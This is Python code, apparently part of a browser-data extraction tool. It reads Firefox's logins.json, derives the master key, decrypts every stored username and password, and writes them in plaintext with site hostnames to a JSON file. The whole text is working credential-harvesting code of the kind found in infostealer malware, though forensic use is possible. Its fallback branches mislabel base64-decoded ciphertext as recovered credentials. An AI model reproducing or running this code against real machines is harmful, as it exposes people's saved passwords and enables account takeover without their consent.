def _decrypt_firefox_login(self, encrypted_data: str, master_key: bytes) -> str:
    """Decrypt Firefox login data using master key - ALWAYS returns plaintext"""
    try:
        encrypted_bytes = base64.b64decode(encrypted_data)
        decoded, _ = decoder.decode(encrypted_bytes)
        iv = bytes(decoded[0])
        ciphertext = bytes(decoded[1])

        cipher = self._create_3des_cipher(master_key, iv)
        decrypted = cipher.decrypt(ciphertext)

        pad_len = decrypted[-1]
        if pad_len > 0 and pad_len <= 8:  # DES3 block size
            decrypted = decrypted[:-pad_len]

        plaintext = decrypted.decode('utf-8', errors='replace')
        return plaintext if plaintext else "[NSS_DECRYPTED_EMPTY]"
    except Exception as e:
        logger.warning(f"Firefox login decryption failed: {e}")
        return f"[NSS_DECRYPTION_FAILED:{encrypted_data[:50]}...]"


def extract_firefox_passwords(self, profile_path: str, master_password: str = "", browser_name: str = "", profile: str = "") -> List[Dict[str, Any]]:
    """Extract passwords from Firefox browser with enhanced NSS decryption - ALWAYS plaintext passwords"""
    logins_path = os.path.join(profile_path, "logins.json")
    if not os.path.exists(logins_path):
        return []

    temp_logins_path = None
    try:
        temp_logins_path = os.path.join(self.temp_base_path, f"temp_logins_{profile}.json")
        shutil.copy2(logins_path, temp_logins_path)

        with open(temp_logins_path, 'r', encoding='utf-8') as f:
            logins_data = json.load(f)

        master_key = self.extract_firefox_master_key(profile_path, master_password)

        passwords = []
        for login in logins_data.get("logins", []):
            username_encrypted = login.get("encryptedUsername", "")
            password_encrypted = login.get("encryptedPassword", "")

            if master_key:
                try:
                    username_value = self._decrypt_firefox_login(username_encrypted, master_key)
                    password_value = self._decrypt_firefox_login(password_encrypted, master_key)
                except:
                    try:
                        username_value = base64.b64decode(username_encrypted).decode('utf-8', errors='replace')
                        password_value = base64.b64decode(password_encrypted).decode('utf-8', errors='replace')
                    except:
                        username_value = "[DECRYPTION_FAILED]" if username_encrypted else "[EMPTY]"
                        password_value = "[DECRYPTION_FAILED]" if password_encrypted else "[EMPTY]"
            else:
                try:
                    username_value = base64.b64decode(username_encrypted).decode('utf-8', errors='replace')
                    password_value = base64.b64decode(password_encrypted).decode('utf-8', errors='replace')
                except:
                    username_value = "[NO_MASTER_KEY]" if username_encrypted else "[EMPTY]"
                    password_value = "[NO_MASTER_KEY]" if password_encrypted else "[EMPTY]"

            if not username_value:
                username_value = "[USERNAME_EMPTY]"
            if not password_value:
                password_value = "[PASSWORD_EMPTY]"

            passwords.append({
                "hostname": login.get("hostname", ""),
                "httpRealm": login.get("httpRealm", ""),
                "formSubmitURL": login.get("formSubmitURL", ""),
                "usernameField": login.get("usernameField", ""),
                "passwordField": login.get("passwordField", ""),
                "username_value": username_value,
                "password_value": password_value,
                "guid": login.get("guid", ""),
                "encType": login.get("encType", 0),
                "timeCreated": login.get("timeCreated", 0),
                "timeLastUsed": login.get("timeLastUsed", 0),
                "timePasswordChanged": login.get("timePasswordChanged", 0)
            })

        output_file = os.path.join(self.output_base_dir, browser_name, "passwords", f"{profile}_passwords.json")
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(passwords, f, indent=2, default=str)

        return passwords

    except Exception as e:
        logger.error(f"Failed to extract Firefox passwords: {e}")
        self.errors.append(f"Firefox passwords extraction failed: {e}")
        return []

    finally:
        try:
            if temp_logins_path and os.path.exists(temp_logins_path):
                os.remove(temp_logins_path)
        except:
            pass

    